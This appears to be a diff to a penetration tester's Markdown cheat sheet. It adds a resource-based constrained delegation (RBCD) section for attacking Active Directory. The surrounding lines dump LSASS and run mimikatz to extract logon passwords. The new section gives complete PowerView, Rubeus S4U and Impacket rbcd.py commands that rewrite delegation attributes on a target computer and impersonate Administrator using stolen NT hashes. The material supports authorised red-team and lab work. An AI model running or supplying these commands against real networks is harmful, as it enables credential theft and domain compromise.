@@ -69,3 +69,35 @@ cp '\\jump09.ops.comply.com\c$\lsass.dmp' .
 sekurlsa::minidump "C:\Users\ofir\Desktop\lsass.dmp"
 sekurlsa::logonpasswords
 ```
+
+### RBCD
+```
+# Using PowerView
+Import-Module .\PowerView.ps1
+# Get domain SID
+$ComputerSid = Get-DomainComputer file06 -Properties objectsid | Select -Expand objectsid
+Convert-SidToName $ComputerSid
+# Create ACE
+# Make sure the change the SID!
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2032401531-514583578-4118054891-1107)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+# Set ACE on target computer
+Get-DomainComputer jump09 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
+# Verify
+$RawBytes = (Get-DomainComputer jump09).'msds-allowedtoactonbehalfofotheridentity'
+(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
+# S4U
+runas /netonly /user:ops.comply.com\administrator cmd.exe
+.\Rubeus.exe s4u /user:file06$ /rc4:[NTHash] /impersonateuser:Administrator /msdsspn:cifs/jump09.ops.comply.com /ptt
+ls \\jump09.ops.comply.com\c$
+
+
+# Using Impacket
+# Read the attribute
+rbcd.py -delegate-to 'target$' -dc-ip 'DomainController' -action 'read' 'domain'/'PowerfulUser':'Password'
+# Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity
+rbcd.py -delegate-from 'controlledaccount' -delegate-to 'target$' -dc-ip 'DomainController' -action 'write' 'domain'/'PowerfulUser':'Password'
+# With NTHash
+python3 rbcd.py -action write -delegate-to "DC01$" -delegate-from "EVILCOMPUTER$" -dc-ip 10.10.10.1 -hashes :[NTHash] test.local/john
+```
